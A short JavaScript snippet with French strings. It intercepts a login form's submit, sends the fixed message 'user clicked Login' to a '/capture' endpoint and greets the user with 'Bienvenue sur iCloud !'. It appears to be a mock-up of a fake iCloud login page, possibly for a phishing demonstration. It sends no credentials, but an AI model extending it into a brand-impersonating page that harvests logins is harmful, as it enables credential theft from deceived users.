document.querySelector(".login-form").addEventListener("submit", function(event) {
    event.preventDefault();
    const interaction = "Utilisateur a cliqué sur Connexion";
    
    // Envoyer l'interaction au serveur
    fetch('/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ interaction })
    })
    .then(response => response.text())
    .then(data => console.log(data))
    .catch(error => console.error('Erreur:', error));

    alert("Bienvenue sur iCloud !");
});